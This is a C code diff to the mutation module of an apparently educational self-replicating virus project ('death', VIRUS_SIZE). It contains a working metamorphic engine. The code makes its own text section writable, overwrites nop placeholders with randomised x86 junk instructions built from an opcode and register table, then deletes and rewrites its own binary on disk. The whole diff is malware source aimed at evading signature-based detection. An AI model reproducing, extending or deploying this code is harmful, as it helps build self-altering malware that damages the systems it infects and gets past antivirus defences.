@@ -6,6 +6,7 @@
 
 #include "utils.h"
 #include "death.h"
+#include "data.h"
 #include "syscall.h"
 
 extern void __attribute__((naked)) _start(void);
@@ -14,14 +15,10 @@ extern void end(void);
 #define VIRUS_SIZE (uintptr_t)&end - (uintptr_t)&_start
 
 int __attribute__((section(".text#"))) g_junk_offsets[NB_JUNK_MAX] = {0};
+uint8_t __attribute__((section(".text#"))) g_rand_junk[RAND_SIZE] = {0};
+
 
 /*
-   This is the matrix of source and destination register opcodes for Intel.
-   For example;
-   0xB8 == "mov"
-   0xB8 + 0xC0 == 0x178 "mov eax, eax"
-   0xB8 + 0xC8 == 0x180 "mov eax, ebx"
-
 	   EAX ECX EDX EBX ESP EBP ESI EDI
    EAX C0  C8  D0  D8  E0  E8  F0  F8
    ECX C1  C9  D1  D9  E1  E9  F1  F9
@@ -61,31 +58,31 @@ static void fill_offsets(uint8_t *self, size_t size, int *junk_offsets) {
 	}
 }
 
-typedef enum {
-	OPCODE_XCHG  = 0x87, // XCHG r/m, r
-	OPCODE_MOV   = 0x8B, // MOV r, r/m
-	OPCODE_MOVSX = 0x63, // MOVSX r, r/m
+enum e_opcode {
 
-	OPCODE_ADD_RM_R = 0x01, // ADD r/m, r
-	OPCODE_ADD_R_RM = 0x03, // ADD r, r/m
+	OPCODE_XCHG  = 0x87,
+	OPCODE_MOV   = 0x8B,
+	OPCODE_MOVSX = 0x63,
 
-	OPCODE_SUB_RM_R = 0x29, // SUB r/m, r
-	OPCODE_SUB_R_RM = 0x2B, // SUB r, r/m
+	OPCODE_ADD_RM_R = 0x01,
+	OPCODE_ADD_R_RM = 0x03,
 
-	OPCODE_ADC  = 0x11, // ADC r/m, r
-	OPCODE_SBB  = 0x19, // SBB r/m, r
-	OPCODE_ADD  = 0x83, // ADD r/m, r
+	OPCODE_SUB_RM_R = 0x29,
+	OPCODE_SUB_R_RM = 0x2B,
 
-    OPCODE_AND  = 0x21, // AND r/m, r
-    OPCODE_OR   = 0x09, // OR r/m, r
-    OPCODE_XOR  = 0x31, // XOR r/m, r
-    OPCODE_TEST = 0x85, // TEST r/m, r
-    OPCODE_CMP  = 0x39,  // CMP r/m, r
+	OPCODE_ADC  = 0x11,
+	OPCODE_SBB  = 0x19,
+	OPCODE_ADD  = 0x83,
 
-} Opcode;
+	OPCODE_AND  = 0x21,
+	OPCODE_OR   = 0x09,
+	OPCODE_XOR  = 0x31,
+	OPCODE_TEST = 0x85,
+	OPCODE_CMP  = 0x39,
 
+};
 
-static uint8_t get_random_opcode(void) {
+static uint8_t get_random_opcode(uint8_t rand) {
 	const uint8_t opcodes[] = {
 		OPCODE_XCHG,
 		OPCODE_MOV,
@@ -103,22 +100,30 @@ static uint8_t get_random_opcode(void) {
 		OPCODE_CMP
 	};
 
-	uint8_t rand;
-	getrandom(&rand, 1, 0);
 	return opcodes[rand % (sizeof(opcodes) / sizeof(opcodes[0]))];
 
 }
 
-static void gen_junk(uint8_t *rdm_junk) {
+static void gen_junk(uint8_t *rdm_junk, uint16_t *r_i) {
 
-	uint8_t rand[2];
-	getrandom(rand, 2, 0);
-	uint8_t reg_1 = rand[0] % 4;
-	uint8_t reg_2 = rand[1] % 4;
+	uint8_t reg_1 = 4;
+	uint8_t reg_2 = 4;
 
-	while (reg_1 == reg_2) {
-		getrandom(rand, 2, 0);
-		reg_2 = rand[1] % 4;
+	uint8_t *rand = g_rand_junk;
+
+	/* check is rsp */
+
+	for (; *r_i < RAND_SIZE && reg_1 == 4; r_i++) {
+		reg_1 = rand[*r_i % RAND_SIZE] % 8;
+	}
+
+	for (; *r_i < RAND_SIZE && (reg_2 == 4 || reg_2 == reg_1); r_i++) {
+		reg_2 = rand[(*r_i + 1) % RAND_SIZE] % 8;
+	}
+
+	if ((reg_1 == 4) || (reg_2 == 4) || (reg_1 == reg_2)) {
+		reg_1 = 0;
+		reg_2 = 1;
 	}
 
 	JUNK;
@@ -132,8 +137,8 @@ static void gen_junk(uint8_t *rdm_junk) {
 	uint8_t nop_1[3] = {OP_64, XCHG, RAX_RAX};
 	uint8_t nop_2[3] = {OP_64, XCHG, RAX_RAX};
 
-	uint8_t opcode_1 = get_random_opcode();
-	uint8_t opcode_2 = get_random_opcode();
+	uint8_t opcode_1 = get_random_opcode(rand[*r_i % RAND_SIZE]);
+	uint8_t opcode_2 = get_random_opcode(rand[(*r_i + 1) % RAND_SIZE]);
 
 	nop_1[1] = opcode_1;
 	nop_1[2] += reg_1;
@@ -159,14 +164,14 @@ static void gen_junk(uint8_t *rdm_junk) {
 
 static void replace_nop(uint8_t *self, int *junk_offsets) {
 
-
+	uint16_t r_i = 0;
 	for (size_t i = 0; i < NB_JUNK_MAX ; i++) {
 		/* at this point junk_offsets is filled */
 		if (junk_offsets[i] == 0) {
 			break;
 		}
 		uint8_t rdm_junk[10];
-		gen_junk(rdm_junk);
+		gen_junk(rdm_junk, &r_i);
 		ft_memcpy(self + junk_offsets[i], rdm_junk, JUNK_LEN);
 
 	}
@@ -187,12 +192,13 @@ static int make_writeable(uint8_t *self, size_t size) {
 	return 0;
 }
 
-void prepare_mutate(int opt) {
-	(void)opt;
+void prepare_mutate(void) {
 
 	uintptr_t start = (uintptr_t)&_start;
 
 	make_writeable((uint8_t *)start, VIRUS_SIZE);
+
+	getrandom(g_rand_junk, RAND_SIZE, 0);
 
 	JUNK;
 
@@ -216,7 +222,7 @@ int death(int start_offset, file_t *file) {
 
 	JUNK;
 
-	uint8_t *self = (uint8_t *)file->view->data;
+	uint8_t *self = (uint8_t *)file->view.data;
 	char *self_name = file->abs_path;
 	int fd;
 
@@ -234,7 +240,7 @@ int death(int start_offset, file_t *file) {
 	replace_nop(entry, g_junk_offsets);
 
 	if (unlink(self_name) == -1) {
-		munmap(self, file->view->size);
+		munmap(self, file->view.size);
 		return -1;
 	}
 
@@ -245,15 +251,15 @@ int death(int start_offset, file_t *file) {
 		return -1;
 
 
-	if (write(fd, self, file->view->size) == -1) {
+	if (write(fd, self, file->view.size) == -1) {
 		close(fd);
-		munmap(self, file->view->size);
+		munmap(self, file->view.size);
 		return -1;
 	}
 
 	JUNK;
 
-	if (munmap(self, file->view->size) == -1) {
+	if (munmap(self, file->view.size) == -1) {
 		close(fd);
 		return -1;
 	}
